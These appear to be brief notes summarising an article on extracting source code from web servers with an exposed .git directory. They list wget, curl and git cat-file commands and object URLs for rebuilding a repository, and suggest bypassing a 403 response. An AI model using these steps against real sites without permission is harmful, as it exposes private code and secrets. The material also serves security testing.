Article : https://medium.com/swlh/hacking-git-directories-e0e60fa79a36
# Hacking Git Directories
- if you get 403 try to bypass it
- If you get 200
### Reconstructing project source from .git directory
- if directory listing is enabled
```bash
wget -r project.com/.git
```

### If listing is not enabled
- The /config file is the Git configuration file for the project.
- The /HEAD file is a file that contains a reference to the current branch.
```bash
> cat .git/HEAD
ref: refs/heads/master
```

### Confirming that files are accessible
```bash
curl https://project.com/.git/config
```

### Other paths are stored in HEAD file
```bash
> cat .git/HEAD
ref: refs/heads/master
> cat .git/refs/heads/master
0a66452433322af3d319a377415a890c70bbd263
> git cat-file -t 0a66452433322af3d319a377415a890c70bbd263
commit
> git cat-file -p 0a66452433322af3d319a377415a890c70bbd263
tree 0a72e6850ef963c6aeee4121d38cf9de773865d8
```

```bash
https://project.com/.git/HEAD (to determine the HEAD)
https://project.com/.git/refs/heads/master (to find the object stored in that HEAD)
https://project.com/.git/objects/0a/72e6850ef963c6aeee4121d38cf9de773865d8 (to access the tree associated with the commit)
https://project.com/.git/objects/9a/3227dca45b3977423bb1296bbc312316c2aa0d (to download the source code stored in the README file)
```


